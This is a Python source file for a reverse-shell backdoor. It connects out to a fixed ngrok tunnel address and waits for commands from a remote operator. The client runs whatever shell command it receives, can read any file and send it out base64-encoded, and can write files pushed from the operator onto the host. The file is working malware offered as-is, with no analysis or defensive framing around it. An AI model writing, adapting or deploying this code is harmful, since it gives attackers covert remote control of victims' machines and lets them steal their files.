import os
import socket
import subprocess
import json
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def codeType(self, byteCode) -> str:

        if type(byteCode) is bytes:
            types_list = ["ascii", "utf-8", "utf-16", "UTF-32", "cp866", "cp1251",
                          "cp1252", "cp1250", "cp437", "cp737", "cp775", "cp852",
                          "cp855", "cp857", "cp860", "cp861", "cp862", "cp863",
                          "cp865", "cp869"]

            for typee in types_list:
                try:
                    return byteCode.decode(f"{typee}")

                except Exception:
                    continue

    def reliable_send(self, data):
        if type(data) is not bytes:
            json_data = json.dumps(data)
            json_data = json_data.encode("utf-8")

        else:
            data = data.decode("utf-8")
            json_data = json.dumps(data)
            json_data = json_data.encode("utf-8")

        self.connection.send(json_data)
        print(f"[+] rel send -> {data}\n")

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        json_data = json_data.decode("utf-8")
        print(f"-- {json_data}")
        command = json.loads(json_data)
        command = command.split(" ")
        print(f"[+] rcv -> {command}")
        return command

    def change_directory_tool(self, path) -> str:
        try:
            if path:
                os.chdir(path)
                return f"[+] Changing working directory to {path}"
        except Exception:
            return "[-] No such file or directory"

    def execute_system_command(self, command) -> str:
        try:
            output = subprocess.check_output(command, shell=True)
            if output != b'':
                output = self.codeType(output)
                return f"[D]\n{output}"
            else:
                return f"[+] {command} completed"
        except subprocess.CalledProcessError:
            self.reliable_send("[-] Unknown command")

    def read_file(self, path):
        with open(path, 'rb')as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def run(self):
        while True:
            #try:
            command = self.reliable_receive()

            if command[0] != "":
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                if command[0] == "cd" and len(command) >= 2:
                    command_result = self.change_directory_tool(command[1])

                if command[0] == "download":
                    command_result = self.read_file(command[1])

                if command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

                print("[!] cmd res type", type(command_result))
                self.reliable_send(command_result)

            #except Exception:
                #command_result = "[-] Error during comand execution :Client as Backdoor"
                #self.reliable_send(command_result)


if __name__ == "__main__":

        ng_ip = "0.tcp.eu.ngrok.io"
        ng_port = 15378

        backdoor = Backdoor(ip=ng_ip, port=ng_port)
        backdoor.run()